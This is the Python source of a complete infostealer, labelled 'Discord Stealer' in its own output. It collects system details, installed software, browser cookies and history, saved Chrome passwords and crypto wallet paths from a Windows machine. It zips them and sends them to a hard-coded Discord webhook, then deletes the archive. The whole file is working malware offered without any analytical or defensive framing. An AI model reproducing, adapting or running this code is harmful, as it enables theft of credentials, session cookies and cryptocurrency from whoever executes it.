
import os
import sys
import socket
import sqlite3
import json
import zipfile
import shutil
import platform
import psutil
import requests
from urllib.request import urlopen, Request
from urllib.error import URLError

# --- Configuration ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1546874268149620806/GqZUiOIUuBrvSpPaEDskbdCt6yEijqlI82Ys1YtAjv818kkywiI9Pl6bCnUX5xPJ8vbp"
ZIP_FILENAME = "steal_data.zip"
ZIP_PATH = os.path.join(os.environ['TEMP'], ZIP_FILENAME)

def get_ip():
    """Get public IP address"""
    try:
        ip = urlopen(Request('https://api.ipify.org', method='GET')).read().decode()
        return ip
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"

def get_system_info():
    """Gather system information"""
    info = {
        "ip": get_ip(),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.getenv('USERNAME'),
        "architecture": platform.machine(),
        "installed_software": [],
        "drives": []
    }
    
    # Get installed software (Registry)
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ)
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name, 0, winreg.KEY_READ)
                try:
                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    if display_name:
                        info["installed_software"].append(display_name)
                except FileNotFoundError:
                    pass
                winreg.CloseKey(subkey)
                i += 1
            except OSError:
                break
    except Exception as e:
        info["installed_software"].append(f"Error getting software: {e}")

    # Get drives
    for drive in psutil.disk_partitions():
        info["drives"].append(f"{drive.device} ({drive.mountpoint})")

    return info

def get_chrome_passwords():
    """Extracts Chrome passwords (Basic extraction, may require DPAPI for full decryption)"""
    chrome_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    login_data_path = os.path.join(chrome_path, "Login Data")
    
    if not os.path.exists(login_data_path):
        return []

    temp_login = os.path.join(os.environ['TEMP'], "temp_login.db")
    try:
        shutil.copy2(login_data_path, temp_login)
    except Exception:
        return []

    passwords = []
    try:
        conn = sqlite3.connect(temp_login)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, user, password = row
            passwords.append({
                "url": url,
                "user": user,
                "password": password.decode('utf-8', errors='ignore') if isinstance(password, bytes) else password
            })
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(temp_login):
            os.remove(temp_login)
            
    return passwords

def get_browsers():
    """Gathers data from common browsers (Chrome, Edge)"""
    data = {}
    browsers_to_check = [
        ("Google", "Chrome"),
        ("Google", "Chrome Beta"),
        ("Google", "Chrome Canary"),
        ("Microsoft", "Edge")
    ]
    
    for vendor, browser in browsers_to_check:
        user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", vendor, browser, "User Data")
        if os.path.exists(user_data_path):
            # Cookies
            cookies_path = os.path.join(user_data_path, "Default", "Cookies")
            if os.path.exists(cookies_path):
                temp_cookies = os.path.join(os.environ['TEMP'], "temp_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                try:
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value, host_key FROM cookies")
                    cookies = cursor.fetchall()
                    data[f"{vendor}_{browser}_cookies"] = cookies
                    conn.close()
                except:
                    pass
                finally:
                    if os.path.exists(temp_cookies):
                        os.remove(temp_cookies)
            
            # History
            history_path = os.path.join(user_data_path, "Default", "History")
            if os.path.exists(history_path):
                temp_history = os.path.join(os.environ['TEMP'], "temp_history.db")
                shutil.copy2(history_path, temp_history)
                try:
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count FROM urls")
                    history = cursor.fetchall()
                    data[f"{vendor}_{browser}_history"] = history
                    conn.close()
                except:
                    pass
                finally:
                    if os.path.exists(temp_history):
                        os.remove(temp_history)

    return data

def get_wallets():
    """Checks for common crypto wallet data files"""
    wallets = []
    wallet_paths = [
        "AppData\\Roaming\\Bitcoin\\wallet.dat",
        "AppData\\Roaming\\Litecoin\\wallet.dat",
        "AppData\\Roaming\\Ethereum\\keystore",
        "AppData\\Roaming\\Monero\\wallets",
        "AppData\\Roaming\\Zcash\\wallets",
        "AppData\\Roaming\\Dash\\wallets",
        "AppData\\Roaming\\XMR\\wallets",
        "AppData\\Roaming\\TronLink\\wallets",
        "AppData\\Roaming\\MetaMask\\keystores"
    ]
    
    for wallet in wallet_paths:
        full_path = os.path.join(os.environ['USERPROFILE'], wallet)
        if os.path.exists(full_path):
            wallets.append(full_path)
            
    return wallets

def create_zip():
    """Zips collected data"""
    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        info = get_system_info()
        zipf.writestr("system_info.json", json.dumps(info, indent=4))
        
        browser_data = get_browsers()
        if browser_data:
            zipf.writestr("browser_data.json", json.dumps(browser_data, indent=4))
            
        passwords = get_chrome_passwords()
        if passwords:
            zipf.writestr("chrome_passwords.json", json.dumps(passwords, indent=4))
            
        wallets = get_wallets()
        if wallets:
            zipf.writestr("wallets_found.txt", "\n".join(wallets))
            
        for drive in psutil.disk_partitions():
            zipf.writestr(f"drive_{drive.device.replace(':', '_')}_info.txt", 
                          f"Mountpoint: {drive.mountpoint}\nFilesystem: {drive.fstype}\nSize: {drive.mountpoint}")

def send_discord_embed(system_info, browser_data, passwords, wallets):
    """Sends data to Discord via Webhook"""
    embed_fields = []
    
    # System Info
    embed_fields.append({
        "name": "System Info",
        "value": f"**IP:** `{system_info['ip']}`\n**Hostname:** `{system_info['hostname']}`\n**OS:** `{system_info['os']}`\n**User:** `{system_info['user']}`\n**Arch:** `{system_info['architecture']}`"
    })
    
    # Wallets
    if wallets:
        embed_fields.append({
            "name": "Wallets Found",
            "value": "\n".join(wallets)
        })
    else:
        embed_fields.append({
            "name": "Wallets",
            "value": "None found"
        })
        
    # Drives
    embed_fields.append({
        "name": "Drives",
        "value": "\n".join(system_info['drives'])
    })

    # Browsers
    if browser_data:
        embed_fields.append({
            "name": "Browsers",
            "value": "Cookies and history collected (check ZIP file)"
        })
        
    # Passwords
    if passwords:
        embed_fields.append({
            "name": "Passwords",
            "value": f"{len(passwords)} passwords found (check ZIP file)"
        })

    # Prepare payload
    payload = {
        "embeds": [{
            "title": f"Infostealer Report for {system_info['hostname']}",
            "description": f"User: `{system_info['user']}`\nIP: `{system_info['ip']}`\nOS: `{system_info['os']}`",
            "fields": embed_fields,
            "color": 15158332, # Red color
            "footer": {
                "text": "Discord Stealer"
            },
            "timestamp": __import__('time').strftime('%Y-%m-%dT%H:%M:%S')
        }]
    }
    
    # Send to webhook
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("[+] Discord embed sent successfully")
        else:
            print(f"[-] Discord embed failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Error sending to Discord: {e}")

def upload_zip_to_discord():
    """Uploads the ZIP file to Discord"""
    try:
        with open(ZIP_PATH, 'rb') as f:
            files = {'file': (ZIP_FILENAME, f, 'application/zip')}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 200:
                print("[+] ZIP file uploaded to Discord")
            else:
                print(f"[-] ZIP upload failed: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Error uploading ZIP: {e}")

def main():
    print(f"[+] Infostealer running on {socket.gethostname()}")
    print(f"[+] Target IP: {get_ip()}")
    
    # Create zip
    create_zip()
    print(f"[+] Data zipped to: {ZIP_PATH}")
    
    # Collect data for embed
    system_info = get_system_info()
    browser_data = get_browsers()
    passwords = get_chrome_passwords()
    wallets = get_wallets()
    
    # Send embed
    send_discord_embed(system_info, browser_data, passwords, wallets)
    
    # Upload ZIP
    upload_zip_to_discord()
    
    # Cleanup
    try:
        os.remove(ZIP_PATH)
        print("[+] Cleanup complete. Zip deleted.")
    except:
        pass

if __name__ == "__main__":
    main()
